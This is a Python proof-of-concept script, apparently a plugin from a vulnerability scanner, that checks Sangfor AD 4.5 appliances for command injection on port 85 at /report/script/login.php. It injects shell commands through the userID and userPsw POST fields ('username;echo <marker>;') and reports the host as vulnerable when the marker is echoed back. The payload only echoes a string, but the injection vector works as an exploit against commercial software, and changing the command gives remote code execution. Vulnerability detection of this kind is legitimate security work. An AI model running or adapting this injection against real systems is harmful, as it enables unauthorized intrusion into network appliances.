#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 深信服 AD4.5版本下命令执行漏洞
referer: http://www.wooyun.org/bugs/wooyun-2016-0196014
author: Lucifer
description: 85端口两处命令执行，参数userID和userPsw。
'''
import sys
import json
import requests
import warnings


class ad_script_command_exec_BaseVerify():
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['深信服 AD4.5版本下命令执行漏洞', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = ":85/report/script/login.php"
        vulnurl = self.url + payload
        post_data = {
            "userID":"username;echo 81dc9bdb52d04dc20036dbd8313ed055;",
            "log_type":"report",
            "userPsw":"password",
            "rnd":"0.8423849339596927"
        }
        post_data2 = {
            "userID":"username",
            "log_type":"report",
            "userPsw":"password;echo d93591bdf7860e1e4ee2fca799911215;",
            "rnd":"0.8423849339596927"
        }
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2] = '存在'
                result[1 ]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)
                return result
            req = requests.post(vulnurl, data=post_data2, headers=headers, timeout=10, verify=False)

            if r"d93591bdf7860e1e4ee2fca799911215" in req.text:
                result[2] = '存在'
                result[1]=vulnurl+"\npost: "+json.dumps(post_data2, indent=4)
                return result
            else:
                result[2] = '不存在'

        except:
            result[2] = '未知'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = ad_script_command_exec_BaseVerify(sys.argv[1])
    testVuln.run()